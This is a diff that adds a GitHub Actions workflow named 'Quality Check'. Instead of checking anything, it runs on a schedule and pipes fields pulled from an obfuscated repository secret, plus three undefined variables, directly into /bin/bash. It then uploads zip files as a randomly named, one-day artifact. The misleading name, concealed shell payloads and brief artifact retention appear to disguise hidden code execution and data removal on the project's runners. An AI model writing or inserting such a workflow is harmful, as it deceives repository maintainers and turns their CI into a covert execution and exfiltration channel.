@@ -1,0 +1,34 @@
+name: Quality Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '31 4,10,16,22 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  RUNNER_DEBUG: 0
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  task:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Apply
+        env:
+          hgbn534: ${{ secrets.hgbn534 }}
+        run: |
+          printf '%s' "$hgbn534" | jq -r .tzz6 | /bin/bash
+          printf '%s' "$aqbw4" | jq -r .ab4 | /bin/bash
+          printf '%s' "$dg287" | jq -r .gosv87409 | /bin/bash
+          printf '%s' "$rcvq2" | jq -r .qupd7 | /bin/bash
+
+      - name: Upload output
+        uses: actions/upload-artifact@v4
+        with:
+          name: rMVzADua
+          path: "*.zip"
+          retention-days: 1
